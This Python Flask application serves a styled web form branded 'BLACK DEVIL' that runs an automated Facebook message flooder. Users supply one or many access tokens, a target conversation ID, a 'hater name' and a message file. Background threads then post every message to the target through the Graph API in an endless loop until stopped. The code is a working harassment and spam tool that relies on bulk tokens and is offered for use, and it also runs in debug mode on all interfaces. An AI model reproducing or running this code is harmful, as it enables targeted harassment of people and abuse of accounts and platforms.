from flask import Flask, request, render_template_string
import requests
from threading import Thread, Event
import time
import random
import string

app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

stop_events = {}
threads = {}

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)
                if response.status_code == 200:
                    print(f"Message Sent Successfully From token {access_token}: {message}")
                else:
                    print(f"Message Sent Failed From token {access_token}: {message}")
                time.sleep(time_interval)

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        token_option = request.form.get('tokenOption')

        if token_option == 'single':
            access_tokens = [request.form.get('singleToken')]
        else:
            token_file = request.files['tokenFile']
            access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))

        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()

        return f'Task started with ID: {task_id}'

    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>😈𝙱𝙻𝙰𝙲𝙺 𝙳𝙴𝚅𝙸𝙻 𝙷𝙴𝚁𝙴🐧</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
    
    * {
      font-family: 'Poppins', sans-serif;
    }
    
    body {
      background: linear-gradient(135deg, #1a2a6c 0%, #b21f1f 50%, #fdbb2d 100%);
      background-size: 400% 400%;
      animation: gradient 15s ease infinite;
      color: white;
      min-height: 100vh;
      margin: 0;
      padding: 20px;
    }
    
    @keyframes gradient {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    
    .container {
      max-width: 400px;
      background: rgba(0, 0, 0, 0.7);
      border-radius: 20px;
      padding: 30px;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
      backdrop-filter: blur(10px);
      border: 1px solid rgba(255, 255, 255, 0.1);
      margin: 30px auto;
    }
    
    .header {
      text-align: center;
      margin-bottom: 30px;
    }
    
    .header h1 {
      font-size: 24px;
      font-weight: 700;
      color: #fff;
      text-shadow: 0 0 10px rgba(255, 0, 0, 0.7);
      margin-bottom: 10px;
    }
    
    .form-control {
      background: rgba(0, 0, 0, 0.3);
      border: 2px solid #4CAF50;
      border-radius: 10px;
      color: white;
      padding: 12px 15px;
      margin-bottom: 20px;
      transition: all 0.3s;
    }
    
    .form-control:focus {
      background: rgba(0, 0, 0, 0.5);
      border-color: #8BC34A;
      box-shadow: 0 0 10px rgba(76, 175, 80, 0.5);
      color: white;
    }
    
    .form-label {
      font-weight: 500;
      margin-bottom: 8px;
      display: block;
      color: #fff;
    }
    
    .btn-submit {
      background: linear-gradient(45deg, #FF416C, #FF4B2B);
      border: none;
      border-radius: 10px;
      padding: 12px;
      font-weight: 600;
      letter-spacing: 1px;
      text-transform: uppercase;
      transition: all 0.3s;
      margin-top: 10px;
    }
    
    .btn-submit:hover {
      transform: translateY(-3px);
      box-shadow: 0 10px 20px rgba(255, 75, 43, 0.3);
    }
    
    .btn-danger {
      background: linear-gradient(45deg, #8E2DE2, #4A00E0);
    }
    
    .btn-danger:hover {
      transform: translateY(-3px);
      box-shadow: 0 10px 20px rgba(142, 45, 226, 0.3);
    }
    
    .footer {
      text-align: center;
      margin-top: 30px;
      color: rgba(255, 255, 255, 0.7);
      font-size: 14px;
    }
    
    .whatsapp-link {
      display: inline-block;
      color: #25d366;
      text-decoration: none;
      margin-top: 15px;
      font-weight: 500;
      transition: all 0.3s;
    }
    
    .whatsapp-link:hover {
      color: #128C7E;
      transform: scale(1.05);
    }
    
    .whatsapp-link i {
      margin-right: 8px;
      font-size: 18px;
    }
    
    .social-link {
      color: #1877F2;
      text-decoration: none;
      transition: all 0.3s;
    }
    
    .social-link:hover {
      color: #0D5FAD;
      text-decoration: underline;
    }
    
    select option {
      background: #333;
      color: white;
    }
    
    .file-input-label {
      display: block;
      margin-bottom: 8px;
    }
    
    .file-input {
      width: 100%;
    }
    
    .glow-text {
      animation: glow 2s ease-in-out infinite alternate;
    }
    
    @keyframes glow {
      from {
        text-shadow: 0 0 5px #fff, 0 0 10px #fff, 0 0 15px #FF416C, 0 0 20px #FF416C;
      }
      to {
        text-shadow: 0 0 10px #fff, 0 0 20px #fff, 0 0 30px #FF4B2B, 0 0 40px #FF4B2B;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1 class="glow-text">🥀🩷𝐖𝐀𝐑 𝐀𝐋𝐀𝐈𝐎𝐍𝐂𝐄 𝐑𝐔𝐋𝐄𝐗😈🐧</h1>
    </div>
    <form method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label for="tokenOption" class="form-label">Select Token Option</label>
        <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
          <option value="single">Single Token</option>
          <option value="multiple">Token File</option>
        </select>
      </div>
      <div class="mb-3" id="singleTokenInput">
        <label for="singleToken" class="form-label">Enter Single Token</label>
        <input type="text" class="form-control" id="singleToken" name="singleToken" placeholder="EAAD6V7...">
      </div>
      <div class="mb-3" id="tokenFileInput" style="display: none;">
        <label for="tokenFile" class="form-label">Choose Token File</label>
        <input type="file" class="form-control file-input" id="tokenFile" name="tokenFile">
      </div>
      <div class="mb-3">
        <label for="threadId" class="form-label">Enter Inbox/convo uid</label>
        <input type="text" class="form-control" id="threadId" name="threadId" placeholder="1000123456789" required>
      </div>
      <div class="mb-3">
        <label for="kidx" class="form-label">Enter Your Hater Name</label>
        <input type="text" class="form-control" id="kidx" name="kidx" placeholder="Hater Name" required>
      </div>
      <div class="mb-3">
        <label for="time" class="form-label">Enter Time (seconds)</label>
        <input type="number" class="form-control" id="time" name="time" placeholder="5" required>
      </div>
      <div class="mb-3">
        <label for="txtFile" class="form-label">Choose Your Np File</label>
        <input type="file" class="form-control file-input" id="txtFile" name="txtFile" required>
      </div>
      <button type="submit" class="btn btn-primary btn-submit">
        <i class="fas fa-rocket"></i> Run
      </button>
    </form>
    <form method="post" action="/stop">
      <div class="mb-3">
        <label for="taskId" class="form-label">Enter Task ID to Stop</label>
        <input type="text" class="form-control" id="taskId" name="taskId" placeholder="Task ID" required>
      </div>
      <button type="submit" class="btn btn-danger btn-submit">
        <i class="fas fa-stop-circle"></i> Stop
      </button>
    </form>
  </div>
  <footer class="footer">
    <p>© 2023 𝐌𝐚𝐃𝐞 𝐁𝐲 𝐁𝐥𝐚𝐂𝐤 𝐃𝐞𝐕𝐢𝐋 𝐇𝐞𝐑𝐞✌️😈🐧</p>
    <p> 😎𝐖𝐚𝐑 𝐀𝐥𝐚𝐈𝐨𝐍𝐂𝐞 𝐑𝐮𝐋𝐞𝐱🌹 
      <a href="https://www.facebook.com/BL9CK.D3V1L" class="social-link">
        <i class="fab fa-facebook"></i> ᴄʟɪᴄᴋ ʜᴇʀᴇ ғᴏʀ ғᴀᴄᴇʙᴏᴏᴋ
      </a>
    </p>
    <div class="mb-3">
      <a href="https://wa.me/+917668337116" class="whatsapp-link">
        <i class="fab fa-whatsapp"></i> Chat on WhatsApp
      </a>
    </div>
  </footer>
  <script>
    function toggleTokenInput() {
      var tokenOption = document.getElementById('tokenOption').value;
      if (tokenOption == 'single') {
        document.getElementById('singleTokenInput').style.display = 'block';
        document.getElementById('tokenFileInput').style.display = 'none';
      } else {
        document.getElementById('singleTokenInput').style.display = 'none';
        document.getElementById('tokenFileInput').style.display = 'block';
      }
    }
    
    // Initialize to show single token input by default
    document.addEventListener('DOMContentLoaded', function() {
      toggleTokenInput();
    });
  </script>
</body>
</html>
''')

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        return f'Task with ID {task_id} has been stopped.'
    else:
        return f'No task found with ID {task_id}.'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
